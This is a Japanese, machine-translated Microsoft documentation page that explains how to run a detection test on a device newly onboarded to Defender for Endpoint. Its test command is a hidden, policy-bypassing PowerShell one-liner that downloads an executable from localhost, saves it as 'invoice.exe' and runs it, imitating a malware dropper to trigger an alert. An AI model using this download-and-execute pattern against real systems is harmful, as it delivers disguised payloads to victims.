---
title: Microsoft Defender for Endpoint デバイスにデバイスを追加した後で検出テストを実行する
description: Microsoft Defender for Endpoint サービスに最近追加されたデバイスで検出スクリプトを実行して、適切にオンボードされていることを確認する
keywords: 検出テスト、検出、powershell、スクリプト、検証、オンボーディング、エンドポイントオンボーディング用 Microsoft Defender、クライアント、サーバー、テスト
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: d3430dc7765dfb7d84110a3a0cbae9f53e89b379
ms.sourcegitcommit: c2d752718aedf958db6b403cc12b972ed1215c00
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 08/26/2021
ms.locfileid: "58573489"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>新しくオンボードされた Microsoft Defender for Endpoint デバイスで検出テストを実行する 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**適用対象:**
- サポートされているWindows 10バージョン
- Windows Server 2012 R2
- Windows Server 2016
- Windowsサーバー、バージョン 1803
- WindowsServer, 2019
- [Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Microsoft Defender ATP を試してみたいですか? [無料試用版にサインアップしてください。](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

オンボード デバイスは、Microsoft Defender for Endpoint サービスにデバイスを追加する方法です。 これにより、デバイスはサービスに信号を報告できます。  

デバイスがサービスに正常に追加されたことを確認することが、展開プロセス全体の重要なステップです。 

## <a name="verify-onboarding-using-a-detection-test"></a>検出テストを使用してオンボーディングを確認する
新しくオンボードされたデバイスで次の PowerShell スクリプトを実行して、Defender for Endpoint サービスに適切に報告されていることを確認します。

1. フォルダーを作成する: 'C:\test-MDATP-test'。
2. デバイスで管理者特権のコマンド ライン プロンプトを開き、スクリプトを実行します。

   1. **[スタート]** をクリックし、「**cmd**」と入力します。

   1. [コマンド プロンプト] を **右クリックし、[** 管理者として **実行] を選択します**。

      ![[管理者スタート メニュー実行] をポイントするウィンドウ のウィンドウ です。](images/run-as-admin.png)

3. プロンプトで、次のコマンドをコピーして実行します。

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

[コマンド プロンプト] ウィンドウが自動的に閉じます。 成功した場合、検出テストは完了としてマークされ、約 10 分でオンボード デバイスのポータルに新しいアラートが表示されます。

## <a name="related-topics"></a>関連項目
- [Windows 10 デバイスのオンボード](configure-endpoints.md)
- [オンボード サーバー](configure-server-endpoints.md)
- [Microsoft Defender for Endpoint オンボーディングの問題のトラブルシューティング](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
